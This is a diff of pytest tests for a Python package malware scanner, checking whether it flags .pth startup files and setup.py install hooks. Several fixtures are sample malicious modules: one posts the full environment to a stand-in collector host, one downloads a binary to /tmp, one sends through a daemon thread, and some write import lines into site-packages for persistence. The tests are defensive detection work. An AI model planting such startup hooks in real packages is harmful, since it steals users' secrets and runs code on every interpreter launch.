@@ -13178,6 +13178,268 @@ class TestStartupFilesRunAtInstall:
         assert not [f for f in findings if f.category.value != "operational"]
 
 
+class TestWhatAPthImportsRunsAtStartup:
+    """data_proxy_for_test 0.1.1: a root `.pth` of `import mcp_proxy.caching`, the module under
+    `src/`, sending what it gathers at module level. A `.pth` runs from site-packages, so its
+    import is the package's own module wherever the package keeps it."""
+
+    @staticmethod
+    def scan(tmp_path, files: dict[str, str]) -> set[str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.foundation.config.settings import Config
+
+        for name, text in files.items():
+            path = tmp_path / name
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.write_text(text, encoding="utf-8")
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        return {f.rule_id for f in result.findings if f.category.value == "malicious"}
+
+    def test_a_src_module_a_pth_imports_runs_at_startup(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "proxy_logging.pth": "import proxy.caching\n",
+                "src/proxy/__init__.py": "",
+                "src/proxy/caching.py": (
+                    "import json, os, urllib.request\n"
+                    "def cache_first():\n"
+                    "    body = json.dumps(dict(os.environ)).encode()\n"
+                    "    urllib.request.urlopen('https://collector.example.invalid/c', body)\n"
+                    "cache_first()\n"
+                ),
+            },
+        )
+        assert found, "the module a .pth imports was not read as startup code"
+
+    def test_a_module_a_pth_imports_that_downloads_at_startup(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "proxy_logging.pth": "import proxy.caching\n",
+                "src/proxy/__init__.py": "",
+                "src/proxy/caching.py": (
+                    "import os, urllib.request\n"
+                    "def cache_first():\n"
+                    "    base = os.environ.get('PROXY_BASE', 'https://cdn.example.invalid')\n"
+                    "    urllib.request.urlretrieve(base + '/native.bin', '/tmp/native.bin')\n"
+                    "cache_first()\n"
+                ),
+            },
+        )
+        assert "MALWARE.INSTALL.STARTUP_NETWORK.001" in found
+
+    def test_a_request_in_a_function_the_startup_never_calls_is_not(self, tmp_path) -> None:
+        # fattummy: the .pth imports the package; its adapters call out only when asked.
+        found = self.scan(
+            tmp_path,
+            {
+                "app.pth": "import app.adapters\n",
+                "src/app/__init__.py": "",
+                "src/app/adapters.py": (
+                    "import urllib.request\n"
+                    "def fetch(url):\n"
+                    "    return urllib.request.urlopen(url).read()\n"
+                ),
+            },
+        )
+        assert "MALWARE.INSTALL.STARTUP_NETWORK.001" not in found
+
+    SETUP = (
+        "import os, shutil, site\n"
+        "from setuptools import setup\n"
+        "from setuptools.command.install import install\n"
+        "class _Install(install):\n"
+        "    def run(self):\n"
+        "        install.run(self)\n"
+        "        sp = site.getsitepackages()[0]\n"
+        "        src = os.path.join(os.path.dirname(__file__), {name!r})\n"
+        "        shutil.copy2(src, {dest})\n"
+        "setup(name='t', version='1', cmdclass={{'install': _Install}})\n"
+    )
+
+    def test_an_install_that_copies_a_pth_into_site_packages(self, tmp_path) -> None:
+        # tinkoff_cloud_apis_internal 8.5.4: telemetry.pth copied into site by `_Install.run`.
+        found = self.scan(
+            tmp_path,
+            {
+                "setup.py": self.SETUP.format(name="telemetry.pth", dest="sp"),
+                "telemetry.pth": "import _telemetry_init\n",
+                "_telemetry_init.py": "",
+            },
+        )
+        assert "MALWARE.INSTALL.PERSIST.001" in found
+
+    def test_an_install_that_copies_data_into_site_packages_is_not(self, tmp_path) -> None:
+        found = self.scan(tmp_path, {"setup.py": self.SETUP.format(name="LICENSE.txt", dest="sp")})
+        assert "MALWARE.INSTALL.PERSIST.001" not in found
+
+    BOOTSTRAP = (
+        "import os, site\n"
+        "from setuptools import setup\n"
+        "def _create_fake_pth(placeholder):\n"
+        "    pth = os.path.join(site.getsitepackages()[0], {name!r})\n"
+        "    with open(pth, 'w') as f:\n"
+        "        f.write({content})\n"
+        "_create_fake_pth('x')\n"
+        "setup(name='t', version='1')\n"
+    )
+
+    def test_the_legacy_bootstrap_writing_a_path_pth_is_not(self, tmp_path) -> None:
+        # nose3 1.3.8, RTMPy 0.1.1: distribute_setup.py writes setuptools.pth holding a directory.
+        content = "os.path.join(os.curdir, 'setuptools-0.6c11-py2.7.egg')"
+        found = self.scan(
+            tmp_path, {"setup.py": self.BOOTSTRAP.format(name="setuptools.pth", content=content)}
+        )
+        assert "MALWARE.INSTALL.PERSIST.001" not in found
+
+    def test_the_bootstrap_in_its_real_open_then_write_form_is_not(self, tmp_path) -> None:
+        setup = (
+            "import os, site\n"
+            "from setuptools import setup\n"
+            "def _create_fake_setuptools_pkg_info(placeholder):\n"
+            "    f = open(os.path.join(placeholder, 'PKG-INFO'), 'w')\n"
+            "    f.write('Metadata-Version: 1.0\\n')\n"
+            "    pth_file = os.path.join(site.getsitepackages()[0], 'setuptools.pth')\n"
+            "    f = open(pth_file, 'w')\n"
+            "    try:\n"
+            "        f.write(os.path.join(os.curdir, 'setuptools.egg-info'))\n"
+            "    finally:\n"
+            "        f.close()\n"
+            "_create_fake_setuptools_pkg_info('x')\n"
+            "setup(name='t', version='1')\n"
+        )
+        assert "MALWARE.INSTALL.PERSIST.001" not in self.scan(tmp_path, {"setup.py": setup})
+
+    def test_writing_an_import_line_into_a_site_pth_still_is(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {"setup.py": self.BOOTSTRAP.format(name="x.pth", content="'import evil\\n'")},
+        )
+        assert "MALWARE.INSTALL.PERSIST.001" in found
+
+    def test_writing_computed_content_into_a_site_pth_still_is(self, tmp_path) -> None:
+        content = "bytes([105, 109, 112]).decode() + placeholder"
+        found = self.scan(
+            tmp_path, {"setup.py": self.BOOTSTRAP.format(name="x.pth", content=content)}
+        )
+        assert "MALWARE.INSTALL.PERSIST.001" in found
+
+    def test_a_pth_copied_into_the_build_tree_is_not(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {"setup.py": self.SETUP.format(name="paths.pth", dest="os.path.join('build', 'x')")},
+        )
+        assert "MALWARE.INSTALL.PERSIST.001" not in found
+
+    TRANSPORT = (
+        "import urllib.request\n"
+        "class Client:\n"
+        "    def __init__(self, dsn):\n"
+        "        self.dsn = dsn\n"
+        "    def initialize(self):\n"
+        "        self._flush_loop()\n"
+        "    def _flush_loop(self):\n"
+        "        urllib.request.urlopen(self.dsn, b'facts')\n"
+    )
+
+    def test_a_send_reached_through_an_instance_at_startup(self, tmp_path) -> None:
+        # tinkoff_cloud_apis_internal 8.5.4: a thread target builds a Client whose methods send.
+        found = self.scan(
+            tmp_path,
+            {
+                "telemetry.pth": "import _telemetry_init\n",
+                "_telemetry_init.py": (
+                    "import threading\n"
+                    "from _telemetry_transport import Client\n"
+                    "def _bootstrap():\n"
+                    "    client = Client('https://t.example.invalid/e')\n"
+                    "    client.initialize()\n"
+                    "threading.Thread(target=_bootstrap, daemon=True).start()\n"
+                ),
+                "_telemetry_transport.py": self.TRANSPORT,
+            },
+        )
+        assert "MALWARE.INSTALL.STARTUP_NETWORK.001" in found
+
+    def test_a_client_class_nothing_builds_at_startup_is_not(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "lib.pth": "import _lib\n",
+                "_lib.py": "from _telemetry_transport import Client\n__all__ = ['Client']\n",
+                "_telemetry_transport.py": self.TRANSPORT,
+            },
+        )
+        assert "MALWARE.INSTALL.STARTUP_NETWORK.001" not in found
+
+    def test_a_pth_line_that_changes_the_process(self, tmp_path) -> None:
+        found = self.scan(tmp_path, {"pkg-setup.pth": "\n\nimport os; os.umask(0)\n"})
+        assert "MALWARE.INSTALL.STARTUP_CODE.001" in found
+
+    def test_namespace_coverage_and_path_lines_are_import_machinery(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "google-nspkg.pth": (
+                    "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
+                    "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));"
+                    "ie = os.path.exists(os.path.join(p,'__init__.py'));"
+                    "m = not ie and not has_mfs and sys.modules.setdefault('google', "
+                    "types.ModuleType('google'));"
+                    "mp = (m or []) and m.__dict__.setdefault('__path__',[]);"
+                    "(p not in mp) and mp.append(p)\n"
+                ),
+                "pytest-cov.pth": (
+                    "import os, sys;exec('if \\'COV_CORE_SOURCE\\' in os.environ:\\n  pass\\n')\n"
+                ),
+                "extra.pth": "import sys; sys.path.insert(0, '/opt/extra')\n",
+            },
+        )
+        assert not found
+
+    def test_a_pth_importing_a_path_finder_is_quiet(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "proxy_paths.pth": "import proxy.finder\n",
+                "src/proxy/__init__.py": "",
+                "src/proxy/finder.py": (
+                    "import os, sys\n"
+                    "sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'vendor'))\n"
+                ),
+            },
+        )
+        assert not found
+
+    def test_calling_into_the_imported_module_is_startup_code(self, tmp_path) -> None:
+        # `import M; M.f()` runs M's code in every interpreter: outside import machinery (the
+        # census holds 2 benign such lines in 17,337 packages: coverage.process_startup and a
+        # sensor bootstrap).
+        found = self.scan(tmp_path, {"boot.pth": "import boot; boot.start()\n", "boot.py": ""})
+        assert "MALWARE.INSTALL.STARTUP_CODE.001" in found
+
+    def test_the_distutils_precedence_shim_is_quiet(self, tmp_path) -> None:
+        found = self.scan(
+            tmp_path,
+            {
+                "distutils-precedence.pth": (
+                    "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
+                    "enabled = os.environ.get(var, 'local') == 'local'; "
+                    "enabled and __import__('_distutils_hack').add_shim(); \n"
+                ),
+                "_distutils_hack/__init__.py": (
+                    "import os, sys\n"
+                    "def enabled():\n"
+                    "    return os.environ.get('SETUPTOOLS_USE_DISTUTILS', 'local') == 'local'\n"
+                    "def add_shim():\n"
+                    "    sys.meta_path.insert(0, object())\n"
+                ),
+            },
+        )
+        assert not found
+
+
 class TestExecutablesNamedAsSource:
     def test_an_elf_named_py_contradicts_its_name(self) -> None:
         from cordon_scanner.detect.binary.detector import BinaryDetector
@@ -13625,7 +13887,7 @@ class TestAPackageNamedLikeAPopularOne:
         from cordon_scanner.foundation.config.settings import Config
 
         root = tmp_path / directory
-        root.mkdir(parents=True)
+        root.mkdir(parents=True, exist_ok=True)
         (root / "setup.py").write_text(
             f"from setuptools import setup\nsetup(name='{name}', version='0.1')\n", encoding="utf-8"
         )
@@ -13648,6 +13910,24 @@ class TestAPackageNamedLikeAPopularOne:
 
     def test_an_unrelated_name_is_quiet(self, tmp_path) -> None:
         assert self._found(tmp_path, "lighthouse-ledger-0.1", "lighthouse-ledger") == []
+
+    def test_a_stub_with_a_few_code_files_still_blocks(self, tmp_path) -> None:
+        """The squats in the malicious sets ship one or two code files: the name is the evidence."""
+        root = tmp_path / "aiiohttp-0.1" / "aiiohttp"
+        root.mkdir(parents=True)
+        for name in ("client.py", "util.py", "web.py"):
+            (root / name).write_text("x = 1\n", encoding="utf-8")
+        assert self._found(tmp_path, "aiiohttp-0.1", "aiiohttp") == ["HIGH"]
+
+    def test_a_project_with_code_of_its_own_is_below_the_gate(self, tmp_path) -> None:
+        """adjango, btorch, dredis, scopy: a real project one edit from a popular name ships its
+        own code, which the content rules judge; the name alone does not block it (pypi-benign
+        F472: 14 of 21 typosquat-only blocks)."""
+        root = tmp_path / "aiiohttp-0.1" / "aiiohttp"
+        root.mkdir(parents=True)
+        for name in ("client.py", "util.py", "web.py", "server.py"):
+            (root / name).write_text("x = 1\n", encoding="utf-8")
+        assert self._found(tmp_path, "aiiohttp-0.1", "aiiohttp") == ["MEDIUM"]
 
 
 class TestMoreDecodersAndDestinations:
